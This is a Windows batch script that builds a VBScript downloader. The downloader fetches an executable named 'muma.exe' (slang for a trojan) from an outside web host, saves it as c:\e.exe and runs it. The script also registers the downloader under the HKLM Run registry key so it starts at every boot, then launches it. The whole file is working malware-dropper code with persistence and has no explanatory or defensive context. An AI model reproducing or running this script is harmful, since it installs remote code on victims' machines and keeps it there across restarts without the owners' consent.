�� &cls
echo Set xPost = createObject("Microsoft.XMLHTTP") >c:\cftmon.vbs
echo xPost.Open "GET","http://www.123.com/muma.exe",0 >>c:\cftmon.vbs
echo xPost.Send() >>c:\cftmon.vbs
echo Set sGet = createObject("ADODB.Stream") >>c:\cftmon.vbs
echo sGet.Mode = 3 >>c:\cftmon.vbs
echo sGet.Type = 1 >>c:\cftmon.vbs
echo sGet.Open() >>c:\cftmon.vbs
echo sGet.Write(xPost.responseBody) >>c:\cftmon.vbs
echo sGet.SaveToFile "c:\e.exe",2 >>c:\cftmon.vbs
echo Set objShell = CreateObject("Wscript.Shell") >>c:\cftmon.vbs
echo objshell.run """c:\e.exe""" >>c:\cftmon.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "c:\cftmon.vbs" /f
c:\cftmon.vbs
